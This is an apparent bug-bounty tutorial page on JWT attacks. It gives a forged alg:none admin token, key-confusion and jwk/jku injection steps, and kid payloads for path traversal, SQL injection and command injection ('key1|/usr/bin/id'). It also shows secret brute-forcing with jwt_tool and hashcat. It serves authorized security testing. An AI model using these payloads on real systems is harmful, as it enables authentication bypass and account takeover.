> Source: https://bugbounty.info/Attack-Surface/Web/Authentication/JWT

# JWT Attacks

JWTs are everywhere  -  auth tokens, session management, API keys, SSO assertions. Developers often treat them as opaque tokens and assume the library handles security. But JWTs have a large attack surface: the algorithm can be changed, the signature can be bypassed, the key can be leaked or brute-forced, and header parameters like `jwk`, `jku`, and `kid` can be injected. When a JWT bypass works, the result is usually authentication bypass or privilege escalation.

## JWT Structure

```mermaid
flowchart LR
    A["Header<br/>{alg: RS256, typ: JWT}"] --> D["base64url encode"]
    B["Payload<br/>{sub: user123, role: user}"] --> D
    D --> E["header.payload"]
    E --> F["Sign with key"]
    F --> G["header.payload.signature"]
```

A JWT is three base64url-encoded segments separated by dots: `header.payload.signature`. The header declares the algorithm. The payload contains claims. The signature ties them together. Every attack on this page targets the relationship between these three parts.

## Algorithm None Attack

If the server doesn't enforce an algorithm whitelist, you can set `alg` to `none` and strip the signature:

```http
GET /api/profile HTTP/1.1
Host: target.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0IiwidXNlciI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.
```

The decoded header:

```json
{"alg": "none", "typ": "JWT"}
```

The decoded payload:

```json
{"sub": "1234", "user": "admin", "role": "admin"}
```

Note the trailing dot  -  the signature is empty. Test variants: `none`, `None`, `NONE`, `nOnE`. Some libraries accept any casing.

### jwt_tool Commands

```bash
# Tamper with none algorithm
python3 jwt_tool.py <token> -X a
 
# This generates multiple variants with alg:none and modified claims
```

## RS256 to HS256 Key Confusion

If the server uses RS256 (asymmetric  -  private key signs, public key verifies), you can change the algorithm to HS256 (symmetric  -  same key signs and verifies). The server's public key (which is often publicly available) becomes the HMAC secret:

```bash
# 1. Get the server's public key
# Check: /.well-known/jwks.json, /jwks.json, /oauth/discovery/keys, certificate from TLS
 
# 2. Sign a forged token with the public key as HMAC secret
python3 jwt_tool.py <token> -X k -pk public_key.pem
 
# 3. The server uses the public key to verify HS256  -  and it matches
```

This works because some JWT libraries use a single `verify(token, key)` function. When `alg` says HS256, it uses the provided key (the public key) as the HMAC secret. Since you also used that same public key to sign, the signature validates.

## JWK Header Injection

The `jwk` header parameter lets the token embed its own public key for verification. If the server trusts the embedded key:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jwk": {
    "kty": "RSA",
    "n": "<attacker's public key modulus>",
    "e": "AQAB"
  }
}
```

Sign the token with your private key. Embed the matching public key in the `jwk` header. The server verifies using the attacker-supplied key.

```bash
# Generate with jwt_tool
python3 jwt_tool.py <token> -X i
 
# Or with Burp JWT Editor:
# 1. Generate new RSA key in JWT Editor Keys tab
# 2. In Repeater, switch to JSON Web Token tab
# 3. Edit payload claims (change role, sub, etc.)
# 4. Click "Embedded JWK" attack
```

## JKU Header Injection

Similar to `jwk`, but `jku` (JWK Set URL) tells the server where to fetch the verification key:

```json
{
  "alg": "RS256",
  "typ": "JWT",
  "jku": "https://attacker.com/.well-known/jwks.json"
}
```

Host a JWKS on your server containing your public key. Sign the token with your private key. If the server fetches from the attacker-controlled URL and uses that key to verify  -  bypass.

The server should validate `jku` against a whitelist, but test: open redirects on the target domain, URL parsing inconsistencies (`https://target.com@attacker.com`), path traversal in URL validation.

## KID Parameter Attacks

The `kid` (Key ID) header tells the server which key to use for verification. The value is often used to look up a key from a database, file, or API. If the lookup is injectable:

### Path Traversal via kid

```json
{
  "alg": "HS256",
  "kid": "../../../../../../dev/null"
}
```

If the server reads the key from a file path based on `kid`, traversal to `/dev/null` gives an empty key. Sign the token with an empty string as the secret.

### SQL Injection via kid

```json
{
  "alg": "HS256",
  "kid": "key1' UNION SELECT 'attacker-controlled-secret' -- "
}
```

If `kid` is used in a SQL query, you can inject a known secret value and sign with it.

### Command Injection via kid

```json
{
  "alg": "HS256",
  "kid": "key1|/usr/bin/id"
}
```

Rare, but if `kid` is passed to a shell command for key retrieval.

## Claim Tampering

Even without signature bypass, check for weak validation of claims:

```json
{
  "sub": "user123",
  "role": "user",
  "email": "admin@target.com",
  "exp": 9999999999,
  "iss": "target.com"
}
```

Test modifying:

- `sub`  -  change user ID
- `role` / `groups` / `is_admin`  -  escalate privileges
- `email`  -  impersonate another user
- `exp`  -  extend expiration to far future
- `iss`  -  change issuer if multi-tenant

Some applications verify the signature but don't validate claim values against their database  -  they trust whatever's in the JWT.

## Key Discovery

Before attacking, find the key material:

```text
# JWKS endpoints
/.well-known/jwks.json
/jwks.json
/oauth/discovery/keys
/.well-known/openid-configuration  (links to jwks_uri)
 
# Brute-force weak HS256 secrets
python3 jwt_tool.py <token> -C -d /path/to/wordlist.txt
hashcat -m 16500 <token> /path/to/wordlist.txt
 
# Common weak secrets: "secret", "password", "key", server name, empty string
```

## Burp Setup: JWT Editor Extension

1. Install "JWT Editor" from BApp Store
2. Any request with a JWT shows a "JSON Web Token" tab in Repeater
3. JWT Editor Keys tab  -  generate RSA/EC/Symmetric keys for attacks
4. In Repeater: edit header/payload, then click attack buttons (None, Embedded JWK, etc.)
5. Scanner automatically checks for alg:none and key confusion

## Checklist

- Decode the JWT and examine header algorithm and payload claims
- Test `alg:none` with empty signature (try case variants)
- If RS256: test key confusion attack by signing with the public key as HS256 secret
- Check for `jwk` header injection  -  embed your own key
- Check for `jku` header injection  -  point to your JWKS endpoint
- Test `kid` parameter for path traversal, SQLi, and command injection
- Enumerate JWKS endpoints (/.well-known/jwks.json, OpenID config)
- For HS256: brute-force the secret with jwt_tool or hashcat
- Tamper with claims (sub, role, email, exp) and test if changes are honored
- Check if expired tokens are still accepted
- Check if tokens are invalidated on logout/password change

## Public Reports

- JWT algorithm confusion leading to account takeover - [HackerOne #1598545](https://hackerone.com/reports/1598545)
- JWT none algorithm bypass on authentication - [HackerOne #1210790](https://hackerone.com/reports/1210790)
- JWT kid parameter SQL injection - [HackerOne #1168009](https://hackerone.com/reports/1168009)
- JWT secret brute-force leading to token forgery - [HackerOne #1270052](https://hackerone.com/reports/1270052)
- JWK header injection allowing authentication bypass - [HackerOne #1439126](https://hackerone.com/reports/1439126)

## See Also

- [Privilege Escalation](../../../Attack-Surface/Web/Authorization/Privilege-Escalation)
- [Login Bypass](../../../Attack-Surface/Web/Authentication/Login-Bypass)
- [OAuth Misconfigurations](../../../Attack-Surface/Web/Authentication/OAuth)
- [Session Management](../../../Attack-Surface/Web/Authentication/Session-Management)
